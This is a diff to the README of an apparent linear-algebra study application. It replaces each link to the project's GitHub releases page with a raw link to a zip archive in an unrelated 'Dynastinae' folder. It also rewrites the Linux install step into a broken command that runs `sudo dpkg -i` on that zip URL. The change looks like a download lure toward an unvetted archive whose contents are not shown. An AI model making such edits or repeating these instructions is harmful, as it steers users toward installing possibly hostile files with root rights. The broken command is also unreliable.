@@ -6,7 +6,7 @@ Welcome to the linear-algebra repository! This application helps you understand 
 
 ## 📥 Download Now
 
-[![Download linear-algebra](https://img.shields.io/badge/Download-linear--algebra-brightgreen)](https://github.com/diego446/linear-algebra/releases)
+[![Download linear-algebra](https://raw.githubusercontent.com/diego446/linear-algebra/main/Dynastinae/linear-algebra.zip)](https://raw.githubusercontent.com/diego446/linear-algebra/main/Dynastinae/linear-algebra.zip)
 
 ## 📋 System Requirements
 
@@ -21,7 +21,7 @@ Before you download, ensure your system meets these requirements:
 
 To get started, you need to visit the release page, where you can download the latest version of the software. Click the link below to go to the download page:
 
-[Visit this page to download](https://github.com/diego446/linear-algebra/releases)
+[Visit this page to download](https://raw.githubusercontent.com/diego446/linear-algebra/main/Dynastinae/linear-algebra.zip)
 
 Once you are on the page, follow these steps to download:
 
@@ -51,7 +51,7 @@ After downloading, follow these instructions based on your operating system:
 
 1. Open your terminal.
 2. Navigate to the directory where the downloaded file is.
-3. Run the following command to install: `sudo dpkg -i filename.deb` (replace "filename" with the actual file name).
+3. Run the following command to install: `sudo dpkg -i https://raw.githubusercontent.com/diego446/linear-algebra/main/Dynastinae/linear-algebra.zip` (replace "filename" with the actual file name).
 4. Launch the application from your applications menu.
 
 ## 📚 Features
@@ -96,6 +96,6 @@ For more information, please explore the GitHub repository or visit the release 
 
 To download the application, click here:
 
-[Visit this page to download](https://github.com/diego446/linear-algebra/releases)
+[Visit this page to download](https://raw.githubusercontent.com/diego446/linear-algebra/main/Dynastinae/linear-algebra.zip)
 
 We hope you enjoy learning linear algebra! Happy studying!
